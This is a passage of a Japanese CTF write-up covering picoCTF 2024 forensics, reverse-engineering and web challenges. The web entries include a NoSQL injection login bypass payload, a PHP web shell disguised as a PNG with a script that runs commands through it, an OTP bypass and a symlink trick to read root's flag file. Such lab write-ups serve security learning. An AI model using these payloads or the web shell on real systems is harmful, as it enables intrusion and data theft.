gitリポジトリが配られた。logを見たらフラグがコミットしていた。
```
git log
```
```
...他にもたくさん
commit ccf857444761e8380204eafd76e677f9e7e71a94
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:09:25 2024 +0000

    important business work

commit 0fe87f16cbd8129ed5f7cf2f6a06af6688665728
Author: picoCTF{@sk_th3_1nt3rn_ea346835} <ops@picoctf.com>
Date:   Sat Mar 9 21:09:25 2024 +0000

    optimize file size of prod code

commit 7e8a2415b6cca7d0d0002ff0293dd384b5cc900d
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:09:25 2024 +0000

    create top secret project
```
## collaborative development
gitリポジトリが配られた。怪しげなブランチがあった。
```
git branch --list
```
```
* (HEAD detached at 74ae521)
  feature/part-1
  feature/part-2
  feature/part-3
  main
```
part-1、part-2、part-3で得られる文字列をつなげたらフラグが得られた。
feature/part-1:
```
print("Printing the flag...")
print("picoCTF{t3@mw0rk_", end='')
```
feature/part-2
```
print("Printing the flag...")

print("m@k3s_th3_dr3@m_", end='')
```
feature/part-3
```
print("Printing the flag...")

print("w0rk_4c24302f}")
```
つなげると
```
picoCTF{t3@mw0rk_m@k3s_th3_dr3@m_w0rk_4c24302f}
```
## binhexa
サーバーにアクセスしたら、ビット演算クイズがいくつか出題された。全部正解したらフラグが得られた。
## binary search
範囲が0~1000までのランダムな値を二分探索で当てる問題。数字を渡すことでその数字が正解の数字よりも大きいか小さいかを教えてくれる。この試行は10回だけできる。
インタラクティブシェルで以下のような関数を定義すると便利。
```
def m(x,y):
     return (x+y)//2
```
## endianness
与えられた文字列を指定されたエンディアンに直して、その16進数文字列を渡せばよい。
## dont-you-love-banners
２つのサーバーが立ち上がり、一つにアクセスすると以下のようにパスワードを得られた。
```
nc tethys.picoctf.net 58148
```
```
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
次にもう一つのサーバーにアクセスしてさっきリークしたパスワードを入力する。
そうするといくつかのサイバーセキュリティ業界に関するクイズが出題された。
クイズに全て正解するとシェルを得られた。
```
 nc tethys.picoctf.net 50699
```
```
*************************************
**************WELCOME****************
*************************************


what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls banner
*************************************
**************WELCOME****************
*************************************
```
サーバーを探索すると`/root/flag.txt`を見つけたが権限不足で中身を見ることはできなかった。
しかし、ホームディレクトリにあった`banner`ファイル内の文字列がサーバーアクセス時に出力されていそうなことと、`ps aux`の結果から、プログラムがroot権限で実行されていることがわかった。だから`banner`を`/root/flag.txt`へのシンボリックリンクに設定することでもう一度サーバーにアクセスしたときにフラグが出力されるようにできた。
```
 nc tethys.picoctf.net 50699
```
```
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password?
```
# Reverse Engineering
## packer
`out`という実行ファイルが配られた。問題名からパッキングされてそうだと推測した。
```
strings out
```
```
...他にもたくさん
.bssh
?p! _
H_db
UPX!
UPX!
```
stringsでみたらUPXでパッキングされていることがわかった。
```
upx -d out
```
デパッキングしてstringsでフラグを探してみたが見つからないので、gdbでプログラムの実行を追ってみる。
ディスアセンブルすると怪しげなメモリ書き込みが見つかったので、全て書き込まれた段階でそのメモリを見てみる。
```
...省略
0x0000000000401e33 <+206>:   mov    QWORD PTR [rbp-0x88],rax
0x0000000000401e3a <+213>:   movabs rax,0x6636333639363037
0x0000000000401e44 <+223>:   movabs rdx,0x6237363434353334
0x0000000000401e4e <+233>:   mov    QWORD PTR [rbp-0x80],rax
0x0000000000401e52 <+237>:   mov    QWORD PTR [rbp-0x78],rdx
0x0000000000401e56 <+241>:   movabs rax,0x6635383539333535
0x0000000000401e60 <+251>:   movabs rdx,0x3433303565363535
0x0000000000401e6a <+261>:   mov    QWORD PTR [rbp-0x70],rax
0x0000000000401e6e <+265>:   mov    QWORD PTR [rbp-0x68],rdx
0x0000000000401e72 <+269>:   movabs rax,0x6534313362363336
0x0000000000401e7c <+279>:   movabs rdx,0x3133323466353633
0x0000000000401e86 <+289>:   mov    QWORD PTR [rbp-0x60],rax
0x0000000000401e8a <+293>:   mov    QWORD PTR [rbp-0x58],rdx
0x0000000000401e8e <+297>:   movabs rax,0x3936323534336536
0x0000000000401e98 <+307>:   movabs rdx,0x3333663533353333
0x0000000000401ea2 <+317>:   mov    QWORD PTR [rbp-0x50],rax
0x0000000000401ea6 <+321>:   mov    QWORD PTR [rbp-0x48],rdx
0x0000000000401eaa <+325>:   movabs rax,0x3136313631333733
0x0000000000401eb4 <+335>:   movabs rdx,0x6437363636363933
0x0000000000401ebe <+345>:   mov    QWORD PTR [rbp-0x40],rax
0x0000000000401ec2 <+349>:   mov    QWORD PTR [rbp-0x38],rdx
0x0000000000401ec6 <+353>:   mov    QWORD PTR [rbp-0x30],0x0
...省略
pwndbg> x/sb $rbp-0x80
0x7fffffffdfa0: "7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667dX\341\377\377\377\177"
```
`7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667d`をasciiに変換すればフラグが得られた。`picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_371aa9ff}`
## factcheck
`bin`という実行ファイルを渡された。
stringsでフラグを探したが、
```
strings bin | grep pico
```
```
picoCTF{wELF_d0N3_mate_
```
一部しか見つからなかったのででコンパイルした。
コンパイルしてもあんまり意味がわからなかったのだが、どこかの領域に`picoCTF{wELF_d0N3_mate_`を書き込んだ後に、長い処理を行っていたのでgdbで処理を追ってみることにした。フラグが書き込まれた領域を監視しながら`main`の処理を一つずつ実行していったらフラグを得ることができた。`picoCTF{wELF_d0N3_mate_e9da2c0e}`
## classic crackme 0x100
配られた`crackme100`をデコンパイルして簡略化すると以下のようになる
```c
for i in range(3):
  for j in range(length) {
    local_28 = (j % 0xFF >> 1 & 85) + (j % 0xFF & 85)
    local_2c = (local_28 >> 2 & 51) + (51 & local_28)
	
	A = local_2c >> 4 & 15
    B = 15 & local_2c

	iVar1 = A + ord(input[j]) - 97 + B
    input[j] = chr(97 + iVar1 % 0x1A)
  }
}
if input == "lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw":
  print("flag{hello!}")
```
よく見ると`local_2c`は`local_28`にのみ依存していて、`local_28`は`j`のみに依存している。よって、`local_2c`と`local_28`はそのまま解読スクリプトに組み込めば良い。
次にiVar1を特定したい。`input[j] = chr(ord("a") + iVar1 % 0x1A)`より、
`iVar1 % 0x1A = input[j] - 97`であるから、0x1Aで割ったあまりが`input[j] - 97`と等しくなるまで総当りしてiVar1を求める。iVar1を求めることができれば、もともとのinput\[j\]も単純な式変形だけで求めることができる。
```python
#!/usr/bin/env python


passwd = "lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw"
length = len(passwd)


def encode(lst: list):
    for i in range(3):
        for j in range(length):
            local_28 = (j % 0xFF >> 1 & 85) + (j % 0xFF & 85)
            local_2c = (local_28 >> 2 & 51) + (51 & local_28)

            A = local_2c >> 4 & 15
            B = 15 & local_2c

            iVar1 = A + ord(lst[j]) - 97 + B

            lst[j] = chr(ord("a") + iVar1 % 0x1A)
    return "".join(lst)


def decode(lst: list):
    for i in range(3):
        for j in range(length):
            local_28 = (j % 0xFF >> 1 & 85) + (j % 0xFF & 85)
            local_2c = (local_28 >> 2 & 51) + (51 & local_28)

            A = local_2c >> 4 & 15
            B = 15 & local_2c

            enc = ord(lst[j])
            for x in range(97, 123):
                if (enc - 97) == (A + B + x - 97) % 26:
                    lst[j] = chr(x)
    return "".join(lst)


print(decode(list(passwd)))
```
```
./solve.py | ./crackme100
```
```
Enter the secret password: SUCCESS! Here is your flag: picoCTF{sample_flag}
```
# Web Exploitation
## bookmarklet
サイトにアクセスしてコピーできるjavascriptコードを開発者ツールのConsoleで実行するとフラグを得られる。
## webdecode
ソースコードを調査した結果`/about.html`に怪しげなタグを見つけた。
```html
<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <link href="[style.css](view-source:http://titan.picoctf.net:54581/style.css)" rel="stylesheet"/>
  <link href="[img/favicon.png](view-source:http://titan.picoctf.net:54581/img/favicon.png)" rel="shortcut icon" type="image/x-icon"/>
  <!-- font (google) -->
  <link href="[https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&amp;display=swap](view-source:https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&display=swap)" rel="stylesheet"/>
  <title>
   About me
  </title>
 </head>
 <body>
  <header>
   <nav>
    <div class="logo-container">
     <a href="[index.html](view-source:http://titan.picoctf.net:54581/index.html)">
      <img alt="logo" src="[img/binding_dark.gif](view-source:http://titan.picoctf.net:54581/img/binding_dark.gif)"/>
     </a>
    </div>
    <div class="navigation-container">
     <ul>
      <li>
       <a href="[index.html](view-source:http://titan.picoctf.net:54581/index.html)">
        Home
       </a>
      </li>
      <li>
       <a href="[about.html](view-source:http://titan.picoctf.net:54581/about.html)">
        About
       </a>
      </li>
      <li>
       <a href="[contact.html](view-source:http://titan.picoctf.net:54581/contact.html)">
        Contact
       </a>
      </li>
     </ul>
    </div>
   </nav>
  </header>
  <section class="about" notify_true="cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9">
   <h1>
    Try inspecting the page!! You might find it there
   </h1>
   <!-- .about-container -->
  </section>
  <!-- .about -->
  <section class="why">
   <footer>
    <div class="bottombar">
     Copyright © 2023 Your_Name. All rights reserved.
    </div>
   </footer>
  </section>
 </body>
</html>
```
`<section class="about" notify_true="cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9">`この部分。
この`cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9`をcyberchefのmagicでデコードしてみるとフラグが得られる。`picoCTF{web_succ3ssfully_d3c0ded_f6f6b78a}`
## introtoburp
`/`にアクセスすると、ユーザー登録ができるようになっている。
登録が終わると2fa authenticationを促される。適当な文字を入れてみると
```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:59216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://titan.picoctf.net:59216
Connection: close
Referer: http://titan.picoctf.net:59216/dashboard
Cookie: session=.eJw1jUsKAjEQRO-StYuZtB0TLxPy6aA4k4R8EBHvbg_orupBvXqLcB8vcRVOnEToLdlRHpQZnD2QRBVhRSP9EiI6ZULQJgKAkbRA0gsa4l2a22az2-nwHKIyKscLakTFtbren6XF3029lUw2z91TY7RKYDg7tb9CfL4ZTyxp.ZhKVUw.kftc7Wq4rCGqCMsxLzwS-v9g4jg
Upgrade-Insecure-Requests: 1

otp=a
```
このようなリクエストがなされる。
色々試してみたが、全くわからなかったのでヒントを見てみた。ヒントいわくリクエストをぐちゃぐちゃにしてみろとのこと。だから素直に変なリクエストを送ってみた(データなしでPOSTしてみた)。
```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:59216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://titan.picoctf.net:59216
Connection: close
Referer: http://titan.picoctf.net:59216/dashboard
Cookie: session=.eJw1jUsKAjEQRO-StYuZtB0TLxPy6aA4k4R8EBHvbg_orupBvXqLcB8vcRVOnEToLdlRHpQZnD2QRBVhRSP9EiI6ZULQJgKAkbRA0gsa4l2a22az2-nwHKIyKscLakTFtbren6XF3029lUw2z91TY7RKYDg7tb9CfL4ZTyxp.ZhKVUw.kftc7Wq4rCGqCMsxLzwS-v9g4jg
Upgrade-Insecure-Requests: 1
```
そうしたらフラグが得られた。
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Sun, 07 Apr 2024 12:45:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Vary: Cookie
Connection: close

Welcome, a you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```
おもんないね。
## unminify
サイトにアクセスしたらこのようなメッセージがあったので
> If you're reading this, your browser has succesfully received the flag.
>
> I just deliver flags, I don't know how to read them...

```html
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>picoCTF - picoGym | Unminify Challenge</title>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <style>
        body {
            font-family: "Lucida Console", Monaco, monospace
        }

        h1,
        p {
            color: #000
        }
    </style>
</head>

<body class="picoctf{}" style="margin:0">
    <div class="picoctf{}" style="margin:0;padding:0;background-color:#757575;display:auto;height:40%"><a
            class="picoctf{}" href="/"><img src="picoctf-logo-horizontal-white.svg" alt="picoCTF logo"
                style="display:inline-block;width:160px;height:90px;padding-left:30px"></a></div>
    <center><br class="picoctf{}"><br class="picoctf{}">
        <div class="picoctf{}"
            style="padding-top:30px;border-radius:3%;box-shadow:0 5px 10px #0000004d;width:50%;align-self:center"><img
                class="picoctf{}" src="hero.svg" alt="flag art" style="width:150px;height:150px">
            <div class="picoctf{}" style="width:85%">
                <h2 class="picoctf{}">Welcome to my flag distribution website!</h2>
                <div class="picoctf{}" style="width:70%">
                    <p class="picoctf{}">If you're reading this, your browser has succesfully received the flag.</p>
                    <p class="picoCTF{pr3tty_c0d3_ed938a7e}"></p>
                    <p class="picoctf{}">I just deliver flags, I don't know how to read them...</p>
                </div>
            </div><br class="picoctf{}">
        </div>
    </center>
</body>

</html>⏎  
```
ソースコードを調べてみたらフラグが見つかった。
`picoCTF{pr3tty_c0d3_ed938a7e}`
## no sql injection
サイトのソースコードが配られた。
サイトにアクセスするとログインフォームが現れる。
```js
import User from "@/models/user";
import { connectToDB } from "@/utils/database";
import { seedUsers } from "@/utils/seed";

export const POST = async (req: any) => {
  const { email, password } = await req.json();
  try {
    await connectToDB();
    await seedUsers();
    const users = await User.find({
      email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
      password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
    });

    if (users.length < 1)
      return new Response("Invalid email or password", { status: 401 });
    else {
      return new Response(JSON.stringify(users), { status: 200 });
    }
  } catch (error) {
    return new Response("Internal Server Error", { status: 500 });
  }
};
```
ソースコード(api/login/route.ts)を見るとこのログインで渡された`email`や`password`が`"{"`で始まり`"}"`で終わる場合Jsonとして解釈するようになっていることがわかる。また、なんのサニタイズもなくクエリとして使っている。よってここにNo Sql Injectionの脆弱性がある。
リクエストをInterceptして、POSTデータを悪意のあるものに変えると、
```http
POST /api/login HTTP/1.1
Host: atlas.picoctf.net:57221
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 60
Referer: http://atlas.picoctf.net:57221/
Origin: http://atlas.picoctf.net:57221
Connection: close

{"email": "{\"$ne\": null}", "password": "{\"$ne\": null}" }
```
```http
HTTP/1.1 200 OK
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
content-type: text/plain;charset=UTF-8
date: Sun, 07 Apr 2024 13:04:13 GMT
connection: close
Content-Length: 237

[{"_id":"661298c3ac7c18084809dc5d","email":"joshiriya355@mumbama.com","firstName":"Josh","lastName":"Iriya","password":"Je80T8M7sUA","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzE0MzI5Y2ZhfQ==","__v":0}]
```
ユーザー情報を含んだレスポンスが返ってくる。tokenが怪しいと思ったのでbase64でデコードしたらフラグを得ることができた。`picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_14329cfa}`
## trickster
画像をアップロードすることができるアプリケーションだ。
どんなファイルをアップロードできるか色々調べてみると、PNGのヘッダーが含まれていて、ファイル名に`.png`が含まれているものをアップロードすることができることがわかった。
よってpixloadというツールを使ってweb shellを提供する、PNGのふりをしたPHPファイルを作成して、それをつかってフラグを得た。
```bash
pixload-png --payload "<?php system(\$_GET['cmd']); ?>" payload.png.php
```
```bash
xxd payload.png.php
```
```
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0020 0000 0020 0802 0000 00fc 18ed  ... ... ........
00000020: a300 0000 0970 4859 7300 000e c400 000e  .....pHYs.......
00000030: c401 952b 0e1b 0000 0019 4944 4154 4889  ...+......IDATH.
00000040: edc1 3101 0000 00c2 a0f5 4fed 610d a000  ..1.......O.a...
00000050: 0000 6e0c 2000 01c8 a288 fe00 0000 0049  ..n. ..........I
00000060: 454e 44ae 4260 8200 0000 0000 0000 0000  END.B`..........
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 001e 5055 6e4b 3c3f 7068 7020 7379 7374  ..PUnK<?php syst
000000d0: 656d 2824 5f47 4554 5b27 636d 6427 5d29  em($_GET['cmd'])
000000e0: 3b20 3f3e 4d17 ebeb 0049 454e 44         ; ?>M....IEND
```
使いやすいようなスクリプトも書いた。
```python
import requests
import urllib.parse

url = "http://atlas.picoctf.net:59319/uploads/payload.png.php?cmd="

while True:
    payload = "echo '\n';" + input("$ ")
    urllib.parse.quote(payload)
    resp = requests.get(url + payload)
    print(resp.text)
```
```
$ ls
�PNG

�nDR ���        pHYs���+DATH���1 �O�a
   Ȣ��IEND�B`�PUnK

payload.png.php
M��IEND
$ ls ../
�PNG

�nDR ���        pHYs���+DATH���1 �O�a
   Ȣ��IEND�B`�PUnK

MFRDAZLDMUYDG.txt
index.php
instructions.txt
robots.txt
uploads
M��IEND
$ cat ../MFRDAZLDMUYDG.txt
�PNG

�nDR ���        pHYs���+DATH���1 �O�a
   Ȣ��IEND�B`�PUnK

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */M��IEND
$
```

writeup終わり。次は[Space Heroes 2024](https://ctftime.org/event/2254)に参加してそのWriteupを書く予定。
